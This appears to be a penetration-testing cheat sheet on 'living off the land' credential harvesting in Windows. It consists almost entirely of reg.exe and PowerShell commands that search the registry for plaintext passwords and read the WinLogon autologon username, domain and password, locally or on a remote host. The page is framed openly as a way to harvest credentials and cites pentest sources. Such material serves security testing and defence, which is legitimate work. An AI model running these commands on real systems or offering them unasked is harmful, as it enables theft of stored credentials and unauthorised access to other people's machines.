# Living off the Land

## 01 - Command Prompt

Using a registry to query the plain text password in the key.

### 1.1 - Search for patterns

```
C:\> reg.exe query hklm /f "password" /t REG_SZ /s /k

C:\> reg.exe query hkcu /f "password" /t REG_SZ /s /k
```

### 1.2 - Query WinLogon registry entry

2. **Method 2:** Windows Autologin (This is a better option to harvest the credentials)

```
C:\> reg.exe query "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"

C:\> reg.exe query "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" [/reg:<32 | 64>] 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

Enumerate one by one.

```
C:\> reg.exe query "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUserName [/reg:<32 | 64>]

C:\> reg.exe query "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultDomainName [/reg:<32 | 64>]

C:\> reg.exe query "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword [/reg:<32 | 64>]
```

## 02 - Powershell

### 2.1 - Search for patterns

```
PS C:\> Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | Select-Object "Default*"
```

### 2.2 - Query WinLogon registry entry

```
PS C:\> Get-ItemPropertyValue -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' -Name DefaultUserName

PS C:\> Get-ItemPropertyValue -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' -Name DefaultDomainName

PS C:\> Get-ItemPropertyValue -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' -Name DefaultPassword
```

---
## References

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)

- [Pentestlab Blog: Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)